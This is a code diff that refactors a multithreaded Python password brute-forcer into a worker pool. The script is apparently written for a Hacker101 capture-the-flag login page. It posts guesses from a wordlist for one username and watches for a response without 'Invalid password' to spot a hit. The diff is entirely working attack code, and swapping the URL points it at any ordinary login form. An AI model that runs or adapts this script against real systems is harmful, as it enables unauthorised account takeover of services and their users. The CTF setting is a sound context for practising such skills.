@@ -1,25 +1,32 @@
 import requests
-from time import sleep
 import threading
 import os
 import sys
+from collections import deque
 
-def check_username(username, password, url):
-    data = {"username": username, "password": password}
-    response = requests.post(url, data=data)
-    if "Invalid password" not in response.text:
-        print(f"Username: {username}, Password: {password}")
-        print(response.text)
-        os._exit(1)
-    else:
-        print(f"Incorrect password: {password}")
+thread_count = 50
 
+def check_username(username, q, url):
+    while q:
+        password = q.popleft()
+        data = {"username": username, "password": password}
+        response = requests.post(url, data=data)
+        if "Invalid password" not in response.text:  # Response text can be different, check the response and change before running the script (after finding correct username).
+            print(f"Username: {username}, Password: {password}")
+            print(response.text)
+            os._exit(1)
+        else:
+            print(f"Incorrect password: {password}")
+
+            
 username = sys.argv[1]
-threads = []
-url = "https://{id}.ctf.hacker101.com/login"
-username_file = open("lists/names.txt", "r")
+url = "https://ID.ctf.hacker101.com/login" # Change to your URL
+# Username and password will be different for each person. This list might not work for everyone.
+username_file = open("lists/usernames.txt", "r")
+q = deque()
 for name in username_file.readlines():
-    if threading.active_count() > 50:
-        sleep(1)
-    threading.Thread(target=check_username, args=(username, name.strip(), url)).start()
-    sleep(0.01)
+    q.append(name.strip())
+
+for i in range(thread_count):
+    threading.Thread(target=check_username, args=(username, q, url)).start()
+
